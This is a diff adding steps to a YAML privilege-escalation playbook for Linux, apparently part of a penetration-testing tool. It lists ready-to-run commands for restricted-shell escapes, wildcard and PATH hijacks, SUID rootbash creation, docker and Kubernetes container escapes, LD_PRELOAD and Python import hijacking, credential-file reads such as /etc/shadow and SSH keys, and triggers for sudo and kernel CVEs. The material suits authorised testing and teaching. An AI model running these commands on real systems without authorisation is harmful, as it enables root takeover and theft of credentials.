@@ -17,6 +17,36 @@ steps:
       - "cat /etc/os-release"
       - "ip addr"
 
+  - id: env-enum
+    name: "Environment Enumeration"
+    phase: recon
+    description: "Enumerate environment variables, PATH, network, and system context"
+    commands:
+      - "env"
+      - "echo $PATH"
+      - "cat /etc/shells"
+      - "cat /etc/fstab"
+      - "route -n || ip route"
+      - "arp -a || ip neigh"
+      - "cat /etc/hosts"
+      - "lpstat 2>/dev/null"
+      - "last -a | head -20"
+      - "w"
+      - "cat /etc/passwd | grep -v nologin | grep -v false"
+
+  - id: restricted-shell-escape
+    name: "Restricted Shell Escape"
+    phase: recon
+    description: "Detect and escape restricted shells (rbash, rksh, rzsh)"
+    commands:
+      - "echo $SHELL; echo $0"
+      - "Try: ssh user@host -t 'bash --noprofile'"
+      - "Try: /bin/sh or /bin/bash"
+      - "Try: vi → :set shell=/bin/bash → :shell"
+      - "Try: awk 'BEGIN {system(\"/bin/bash\")}'"
+      - "Try: find / -exec /bin/bash \\; -quit"
+      - "Try: python3 -c 'import os; os.system(\"/bin/bash\")'"
+
   - id: sudo-check
     name: "Sudo Permissions"
     phase: enumeration
@@ -33,6 +63,17 @@ steps:
       - "find / -perm -4000 -type f 2>/dev/null"
       - "find / -perm -2000 -type f 2>/dev/null"
 
+  - id: path-abuse
+    name: "PATH Abuse"
+    phase: exploitation
+    description: "Hijack commands via writable PATH directories or relative path calls in SUID binaries"
+    commands:
+      - "echo $PATH"
+      - "find / -writable -type d 2>/dev/null | head -20"
+      - "Check SUID binaries for relative path calls: strings <binary> | grep -v '/'"
+      - "Exploit: create malicious binary in writable PATH dir ahead of real binary"
+      - "export PATH=/tmp:$PATH"
+
   - id: cron-jobs
     name: "Cron Jobs & Timers"
     phase: enumeration
@@ -42,6 +83,15 @@ steps:
       - "ls -la /etc/cron.d/"
       - "systemctl list-timers --all"
 
+  - id: wildcard-abuse
+    name: "Wildcard Abuse"
+    phase: exploitation
+    description: "Exploit wildcard expansion in cron jobs (tar, rsync, chown)"
+    commands:
+      - "Check cron for commands using * wildcards (tar cf *, rsync *, chown *)"
+      - "tar checkpoint exploit: echo '' > '--checkpoint-action=exec=shell.sh'; echo '' > --checkpoint=1"
+      - "Create shell.sh: #!/bin/bash\\ncp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash"
+
   - id: writable-files
     name: "Writable Files & Directories"
     phase: enumeration
@@ -49,6 +99,50 @@ steps:
     commands:
       - "find / -writable -type f 2>/dev/null | grep -v proc"
       - "find / -writable -type d 2>/dev/null | grep -v proc"
+
+  - id: privileged-groups
+    name: "Privileged Groups"
+    phase: enumeration
+    description: "Check group memberships for privesc paths (docker, lxd, disk, adm)"
+    commands:
+      - "id"
+      - "docker group: docker run -v /:/mnt --rm -it alpine chroot /mnt sh"
+      - "lxd group: lxc init ubuntu:22.04 privesc -c security.privileged=true"
+      - "disk group: debugfs /dev/sda1 → cat /root/.ssh/id_rsa"
+      - "adm group: find /var/log -readable -type f 2>/dev/null | head -20"
+      - "video group: cat /dev/fb0 > screenshot.raw"
+
+  - id: capabilities
+    name: "Linux Capabilities"
+    phase: enumeration
+    description: "Find binaries with dangerous capabilities"
+    commands:
+      - "getcap -r / 2>/dev/null"
+      - "cap_setuid: python3 -c 'import os; os.setuid(0); os.system(\"/bin/bash\")'"
+      - "cap_dac_override: python3 script to overwrite /etc/passwd or /etc/shadow"
+      - "cap_sys_admin: mount host disk inside container"
+      - "cap_net_raw: tcpdump to capture cleartext creds"
+
+  - id: vulnerable-services
+    name: "Vulnerable Services"
+    phase: exploitation
+    description: "Check versions of running/installed services for known exploits"
+    commands:
+      - "dpkg -l 2>/dev/null | grep -iE 'screen|tmux|sudo|pkexec|snap|docker'"
+      - "rpm -qa 2>/dev/null | grep -iE 'screen|tmux|sudo|polkit|snap|docker'"
+      - "Screen 4.5.0: screenroot.sh (local root)"
+      - "searchsploit <service> <version>"
+
+  - id: logrotate-abuse
+    name: "Logrotate Exploitation"
+    phase: exploitation
+    description: "Exploit logrotate race condition with logrotten"
+    commands:
+      - "logrotate --version"
+      - "cat /etc/logrotate.conf; ls /etc/logrotate.d/"
+      - "find / -writable -name '*.log' 2>/dev/null"
+      - "logrotten -p payload.sh /writable/log/file"
+      - "Payload writes to /etc/bash_completion.d/ for root shell on next login"
 
   - id: credentials
     name: "Credential Hunting"
@@ -59,6 +153,53 @@ steps:
       - "grep -ri 'password' /etc/ 2>/dev/null | head -20"
       - "ls -la /home/*/.ssh/"
       - "cat /etc/shadow 2>/dev/null"
+
+  - id: nfs-abuse
+    name: "NFS no_root_squash"
+    phase: exploitation
+    description: "Exploit NFS shares with no_root_squash to create SUID binaries"
+    commands:
+      - "showmount -e <target>"
+      - "cat /etc/exports"
+      - "Look for no_root_squash option"
+      - "Mount on attacker: mount -t nfs <target>:/share /mnt"
+      - "As root on attacker: cp /bin/bash /mnt/rootbash && chmod +s /mnt/rootbash"
+      - "On target: /share/rootbash -p"
+
+  - id: tmux-hijack
+    name: "Tmux/Screen Session Hijacking"
+    phase: exploitation
+    description: "Attach to root-owned tmux or screen sessions via shared sockets"
+    commands:
+      - "tmux ls 2>/dev/null"
+      - "screen -ls 2>/dev/null"
+      - "ps aux | grep -E 'tmux|screen'"
+      - "find / -name '*.sock' -o -name '*.socket' 2>/dev/null | head -10"
+      - "tmux -S /path/to/shared/socket attach"
+      - "screen -x root/"
+
+  - id: shared-library-abuse
+    name: "Shared Library Hijacking"
+    phase: exploitation
+    description: "Exploit LD_PRELOAD, missing shared objects, or RUNPATH to load malicious libraries"
+    commands:
+      - "Check sudo -l for env_keep+=LD_PRELOAD"
+      - "LD_PRELOAD: gcc -shared -fPIC -nostartfiles -o /tmp/evil.so evil.c; sudo LD_PRELOAD=/tmp/evil.so <cmd>"
+      - "Shared object hijacking: strace <suid-binary> 2>&1 | grep 'open.*no such file'"
+      - "readelf -d <binary> | grep -E 'RUNPATH|RPATH'"
+      - "ldd <binary>"
+      - "Place malicious .so in writable RUNPATH dir"
+
+  - id: python-library-hijack
+    name: "Python Library Hijacking"
+    phase: exploitation
+    description: "Hijack Python imports via writable module paths or PYTHONPATH"
+    commands:
+      - "python3 -c 'import sys; print(\"\\n\".join(sys.path))'"
+      - "Check writable dirs in sys.path: find <each_path> -writable 2>/dev/null"
+      - "Check module file perms: pip3 show <module> | grep Location; ls -la <location>/<module>.py"
+      - "Create malicious module in higher-priority path with reverse shell"
+      - "PYTHONPATH abuse: export PYTHONPATH=/tmp:$PYTHONPATH"
 
   - id: webserver-enum
     name: "Web Server & Reverse Proxy Enumeration"
@@ -126,13 +267,56 @@ steps:
       - "find / -name 'appsettings.json' -o -name 'appsettings.Production.json' 2>/dev/null | xargs cat"
       - "find / -name 'config.toml' -o -name 'config.yaml' -not -path '*/proc/*' 2>/dev/null | xargs cat"
 
-  - id: kernel-exploit
+  - id: container-escape
+    name: "Container Escapes"
+    phase: exploitation
+    description: "Escape Docker, LXD, or Kubernetes containers to the host"
+    commands:
+      # Detect container
+      - "cat /proc/1/cgroup 2>/dev/null | grep -iE 'docker|lxc|kubepods'"
+      - "ls -la /.dockerenv 2>/dev/null"
+      - "cat /proc/self/mountinfo | grep -i docker"
+      # Docker — shared directory
+      - "mount | grep -E 'overlay|/host'"
+      - "Check for writable host mounts in /proc/self/mountinfo"
+      # Docker — socket
+      - "ls -la /var/run/docker.sock"
+      - "docker -H unix:///var/run/docker.sock run -v /:/host -it alpine chroot /host"
+      # Docker — privileged mode
+      - "ip link add dummy0 type dummy 2>/dev/null && echo PRIVILEGED || echo UNPRIVILEGED"
+      - "mkdir /tmp/host; mount /dev/sda1 /tmp/host"
+      # Kubernetes
+      - "kubeletctl pods -s <node>"
+      - "kubeletctl exec 'id' -p <pod> -c <container> -s <node>"
+      - "Create privileged pod with hostPath mount to /"
+
+  - id: kernel-os-exploit
     name: "Kernel / OS Exploits"
     phase: exploitation
     description: "Check for known kernel or OS-level vulnerabilities"
     commands:
       - "uname -r"
       - "searchsploit linux kernel $(uname -r | cut -d'-' -f1)"
+
+  - id: known-cves
+    name: "Known CVE Checks"
+    phase: exploitation
+    description: "Check for specific high-impact CVEs based on installed versions"
+    commands:
+      # Sudo
+      - "sudo --version"
+      - "CVE-2021-3156 (Baron Samedit): sudo < 1.9.5p2 — sudoedit -s '\\' $(python3 -c 'print(\"A\"*1000)')"
+      - "CVE-2019-14287: sudo < 1.8.28 — sudo -u#-1 /bin/bash"
+      # Polkit
+      - "pkexec --version"
+      - "CVE-2021-4034 (PwnKit): pkexec < 0.120 — run pwnkit exploit binary"
+      # Kernel
+      - "CVE-2022-0847 (Dirty Pipe): kernel 5.8 - 5.16.11 — overwrites read-only files"
+      - "CVE-2016-5195 (Dirty COW): kernel 2.x - 4.x before 4.8.3"
+      # Netfilter
+      - "CVE-2021-22555: kernel 2.6.19 - 5.12 (Netfilter setsockopt)"
+      - "CVE-2022-25636: kernel 5.4 - 5.6.10 (nf_tables)"
+      - "CVE-2023-32233: kernel < 6.3.2 (nf_tables use-after-free)"
 
   - id: automated-enum
     name: "Run Automated Enumeration"
